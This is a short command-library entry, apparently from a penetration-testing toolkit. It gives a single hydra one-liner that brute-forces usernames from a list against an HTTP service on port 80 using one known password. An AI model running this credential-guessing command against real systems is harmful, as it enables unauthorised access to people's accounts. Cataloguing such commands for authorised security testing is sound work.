---
id: 051b8b4a-64d6-4197-a5c8-b93737a3265b
name: Bruteforce Usernames from a list, using a known password
type: command
executor: bash
data: 'hydra -L usernames.txt -p $password  $ip http-get / -s 80

  '
output: null
created_at: '2020-07-14T18:14:45.644179+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Bruteforce Usernames from a list, using a known password

```bash
hydra -L usernames.txt -p $password  $ip http-get / -s 80

```


